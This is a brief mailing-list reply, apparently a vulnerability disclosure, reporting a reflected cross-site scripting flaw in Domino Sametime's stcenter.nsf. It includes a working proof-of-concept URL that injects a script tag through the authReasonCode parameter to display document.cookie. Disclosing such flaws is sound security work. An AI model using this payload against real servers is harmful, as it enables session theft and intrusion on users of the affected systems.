Subject: Re: Domino Sametime Multiple Reflected Cross-Site Scripting

Hi,


I discovered similar XSS affecting Domino Sametime some time ago...

This XSS affects other scripts also... 

i.e. stcenter.nsf

Here's an example:

/stcenter.nsf?OpenDatabase&authReasonCode="><script>alert(document.cookie);</script>"


Cheers

Andrew
